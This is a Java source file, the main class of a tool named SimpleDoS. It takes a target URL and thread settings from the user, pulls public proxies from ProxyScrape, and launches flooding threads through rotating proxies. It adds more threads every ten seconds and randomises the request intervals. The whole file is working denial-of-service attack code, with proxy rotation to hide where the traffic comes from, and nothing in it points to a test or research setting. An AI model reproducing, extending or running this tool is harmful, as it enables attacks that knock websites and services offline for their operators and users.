package f76goat.simpledos;

import java.io.UnsupportedEncodingException;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class SimpleDoS {

    public static void main(String[] args) throws MalformedURLException, UnsupportedEncodingException {
        UserInterface ui = new UserInterface();

        String url = ui.getRequestUrl();

        int initialThreads = 10; // Start with 10 threads
        int maxThreads = ui.getThreadCount(); // Get the maximum number of threads from the user
        int minRequestInterval = ui.getRequestInterval();
        int maxRequestInterval = minRequestInterval + 100; // Randomize interval
        int incrementInterval = 10; // Increment every 10 seconds
        int incrementAmount = 10; // Increase by 10 threads each increment

        // Fetch proxies from ProxyScrape
        List<String> proxies;
        try {
            proxies = ProxyFetcher.fetchProxies();
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }

        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        ThreadPoolExecutor executor = (ThreadPoolExecutor) Executors.newFixedThreadPool(initialThreads);

        // Schedule the thread increment task
        scheduler.scheduleAtFixedRate(() -> {
            int currentThreads = executor.getPoolSize();
            if (currentThreads < maxThreads) {
                int newThreads = Math.min(currentThreads + incrementAmount, maxThreads);
                executor.setCorePoolSize(newThreads);
                executor.setMaximumPoolSize(newThreads);
                System.out.println("Increased threads to: " + newThreads);
                for (int i = currentThreads; i < newThreads; i++) {
                    try {
                        String proxyAddress = proxies.get(i % proxies.size());
                        String[] parts = proxyAddress.replace("http://", "").split(":");
                        if (parts.length == 2) {
                            String proxyHost = parts[0];
                            int proxyPort;
                            try {
                                proxyPort = Integer.parseInt(parts[1]);
                            } catch (NumberFormatException e) {
                                System.err.println("Invalid proxy port: " + parts[1]);
                                continue;
                            }
                            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
                            DoSThread thread = new DoSThread(url, minRequestInterval, maxRequestInterval, 20000, proxy); // Example timeout value
                            executor.execute(thread);
                        } else {
                            System.err.println("Invalid proxy format: " + proxyAddress);
                        }
                    } catch (MalformedURLException | UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
                }
            } else {
                scheduler.shutdown();
            }
        }, incrementInterval, incrementInterval, TimeUnit.SECONDS);

        // Start with initial threads
        for (int i = 0; i < initialThreads; i++) {
            String proxyAddress = proxies.get(i % proxies.size());
            String[] parts = proxyAddress.replace("http://", "").split(":");
            if (parts.length == 2) {
                String proxyHost = parts[0];
                int proxyPort;
                try {
                    proxyPort = Integer.parseInt(parts[1]);
                } catch (NumberFormatException e) {
                    System.err.println("Invalid proxy port: " + parts[1]);
                    continue;
                }
                Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
                DoSThread thread = new DoSThread(url, minRequestInterval, maxRequestInterval, 20000, proxy); // Example timeout value
                executor.execute(thread);
            } else {
                System.err.println("Invalid proxy format: " + proxyAddress);
            }
        }
    }
}
